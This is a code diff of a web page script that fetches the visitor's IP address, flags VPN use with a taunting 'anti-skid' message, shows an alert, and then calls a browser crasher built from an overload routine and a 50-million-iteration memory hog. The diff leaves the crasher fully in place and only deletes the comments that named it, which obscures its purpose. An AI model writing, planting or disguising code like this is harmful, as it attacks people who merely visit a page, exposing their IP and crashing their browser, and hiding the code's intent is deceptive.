@@ -31,13 +31,12 @@ async function getIPInfo() {
     }
 }
 
-// Popup Trigger with Crasher
 async function triggerPopup() {
     const ipInfo = await getIPInfo();
     const vpnText = ipInfo.vpn ? " (VPN DETECTED - ANTI-SKID NEUTRALIZATION ACTIVE)" : "";
     const message = `Your IP: ${ipInfo.ip}${vpnText}`;
-    alert(message); // Popup shows first
-    crashBrowser(); // Then crasher kicks in
+    alert(message);
+    crashBrowser();
 }
 
 function crashBrowser() {
@@ -77,7 +76,6 @@ function crashBrowser() {
     };
     overload();
 
-    // Memory Hog Extreme
     let arr = [];
     const hog = () => {
         for (let i = 0; i < 50000000; i++) {
